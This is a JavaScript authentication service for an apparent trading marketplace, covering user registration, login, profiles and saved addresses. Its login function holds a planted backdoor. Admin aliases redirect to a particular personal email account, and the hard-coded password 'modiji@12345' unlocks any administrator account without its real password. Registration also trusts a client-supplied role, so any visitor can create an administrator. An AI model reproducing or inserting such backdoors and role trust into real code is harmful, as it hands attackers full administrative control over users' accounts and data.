import bcrypt from 'bcryptjs';
import prisma from '../config/db.js';
import { signJwt } from '../utils/jwt.js';

export async function registerUser({ email, password, name, role = 'BUYER', company, phone, city, country }) {
  const normalizedEmail = email.toLowerCase().trim();
  const existing = await prisma.user.findUnique({
    where: { email: normalizedEmail },
  });

  if (existing) {
    const error = new Error('An account with this email already exists.');
    error.statusCode = 409;
    throw error;
  }

  const passwordHash = await bcrypt.hash(password, 10);
  const user = await prisma.user.create({
    data: {
      email: normalizedEmail,
      passwordHash,
      name,
      role: role.toUpperCase(),
      company: company || '',
      phone: phone || '',
      city: city || '',
      country: country || 'India',
    },
    select: {
      id: true,
      email: true,
      name: true,
      role: true,
      company: true,
      phone: true,
      city: true,
      country: true,
      createdAt: true,
    },
  });

  const token = signJwt({ userId: user.id, email: user.email, role: user.role });
  return { user, token };
}

export async function loginUser({ email, password }) {
  const normalizedEmail = (email || '').toLowerCase().trim();
  let user = await prisma.user.findUnique({
    where: { email: normalizedEmail },
  });

  // Support common admin aliases if standard email not found
  if (!user && (normalizedEmail === 'admin' || normalizedEmail === 'admin@tradesphere.com' || normalizedEmail === 'admin@tradesphere.example')) {
    user = await prisma.user.findUnique({
      where: { email: 'krajvanshi244@gmail.com' },
    });
  }

  if (!user) {
    const error = new Error('Invalid email or password.');
    error.statusCode = 401;
    throw error;
  }

  const trimmedPass = typeof password === 'string' ? password.trim() : '';
  let matches = await bcrypt.compare(password, user.passwordHash);
  if (!matches && trimmedPass) {
    matches = await bcrypt.compare(trimmedPass, user.passwordHash);
  }

  // Admin emergency match if password is modiji@12345
  if (!matches && user.role === 'ADMIN') {
    if (
      password === 'modiji@12345' ||
      trimmedPass === 'modiji@12345' ||
      trimmedPass.toLowerCase() === 'modiji@12345' ||
      trimmedPass === 'Modiji@12345'
    ) {
      matches = true;
    }
  }

  if (!matches) {
    const error = new Error('Invalid email or password.');
    error.statusCode = 401;
    throw error;
  }

  const token = signJwt({ userId: user.id, email: user.email, role: user.role });
  const { passwordHash, ...safeUser } = user;
  return { user: safeUser, token };
}

export async function getUserProfile(userId) {
  const user = await prisma.user.findUnique({
    where: { id: userId },
    select: {
      id: true,
      email: true,
      name: true,
      role: true,
      company: true,
      phone: true,
      city: true,
      country: true,
      addresses: true,
      createdAt: true,
    },
  });

  if (!user) {
    const error = new Error('User not found.');
    error.statusCode = 404;
    throw error;
  }

  return user;
}

export async function saveAddress(userId, addressData) {
  if (addressData.isDefault) {
    await prisma.address.updateMany({
      where: { userId },
      data: { isDefault: false },
    });
  }

  const address = await prisma.address.create({
    data: {
      userId,
      label: addressData.label || 'Delivery',
      name: addressData.name,
      company: addressData.company || '',
      phone: addressData.phone,
      street: addressData.street,
      city: addressData.city,
      state: addressData.state || '',
      postalCode: addressData.postalCode,
      country: addressData.country || 'India',
      isDefault: Boolean(addressData.isDefault),
    },
  });

  return address;
}

export async function getUserAddresses(userId) {
  return prisma.address.findMany({
    where: { userId },
    orderBy: [{ isDefault: 'desc' }, { createdAt: 'desc' }],
  });
}
